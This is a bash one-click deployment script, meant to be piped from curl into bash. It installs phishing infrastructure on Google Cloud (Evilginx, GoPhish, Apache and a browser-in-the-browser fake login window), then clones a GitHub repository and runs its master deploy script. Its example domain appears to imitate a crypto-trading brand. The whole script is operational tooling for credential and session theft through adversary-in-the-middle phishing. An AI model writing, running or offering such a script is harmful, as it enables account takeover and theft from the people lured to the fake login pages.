#!/bin/bash

#############################################
# Frameless BITB - One-Click Quick Deploy
# Usage: curl -fsSL [URL] | bash
#############################################

set -e

GREEN='\033[0;32m'
BLUE='\033[0;34m'
YELLOW='\033[1;33m'
MAGENTA='\033[0;35m'
NC='\033[0m'

clear
echo -e "${MAGENTA}"
cat << "EOF"
╔═══════════════════════════════════════════════════════════════╗
║                                                               ║
║           FRAMELESS BITB - QUICK DEPLOYMENT                   ║
║                                                               ║
║     Automated GCP Infrastructure Setup                        ║
║     Evilginx + GoPhish + Apache + BITB                        ║
║                                                               ║
╚═══════════════════════════════════════════════════════════════╝
EOF
echo -e "${NC}"
echo ""

echo -e "${BLUE}Preparing for deployment...${NC}"
echo ""

# Check if running in Cloud Shell
if [ -z "$CLOUD_SHELL" ]; then
    echo -e "${YELLOW}WARNING: Not running in Cloud Shell${NC}"
    echo "This script is optimized for Google Cloud Shell"
    echo ""
    echo -e "${BLUE}To use Cloud Shell, visit: https://console.cloud.google.com/${NC}"
    echo ""
    read -p "Continue anyway? (y/n): " -n 1 -r
    echo
    if [[ ! $REPLY =~ ^[Yy]$ ]]; then
        exit 0
    fi
fi

# Check for gcloud
if ! command -v gcloud &> /dev/null; then
    echo -e "${RED}ERROR: gcloud CLI not found${NC}"
    echo "Install from: https://cloud.google.com/sdk/docs/install"
    exit 1
fi

# Prompt for domain
echo -e "${BLUE}Configuration Setup${NC}"
echo ""
echo -e "${YELLOW}Enter your domain name:${NC}"
read -p "Domain (e.g., exodustraderai.info): " DOMAIN

if [ -z "$DOMAIN" ]; then
    echo -e "${RED}ERROR: Domain is required${NC}"
    exit 1
fi

EMAIL="admin@${DOMAIN}"
echo -e "${YELLOW}Enter admin email:${NC}"
read -p "Email [$EMAIL]: " INPUT_EMAIL
if [ -n "$INPUT_EMAIL" ]; then
    EMAIL="$INPUT_EMAIL"
fi

# Set up temporary directory
TEMP_DIR="/tmp/bitbevilgophish-deploy-$$"
mkdir -p "$TEMP_DIR"
cd "$TEMP_DIR"

echo ""
echo -e "${GREEN}Downloading deployment scripts...${NC}"

# Clone repository
git clone https://github.com/theroseinc/bitbevilgophish.git . &>/dev/null || {
    echo -e "${RED}Failed to clone repository${NC}"
    exit 1
}

echo -e "${GREEN}Repository downloaded${NC}"
echo ""

# Set environment variables
export DOMAIN="$DOMAIN"
export EMAIL="$EMAIL"
export USE_CLOUD_DNS="true"

# Make script executable
chmod +x master-deploy.sh

echo -e "${BLUE}Starting automated deployment...${NC}"
echo ""
echo -e "${YELLOW}This will take approximately 20-40 minutes${NC}"
echo -e "${YELLOW}Please do not close this window${NC}"
echo ""
sleep 3

# Run the master deployment script
bash master-deploy.sh

# Cleanup
cd /
rm -rf "$TEMP_DIR"

echo ""
echo -e "${GREEN}Quick deployment complete!${NC}"
echo ""
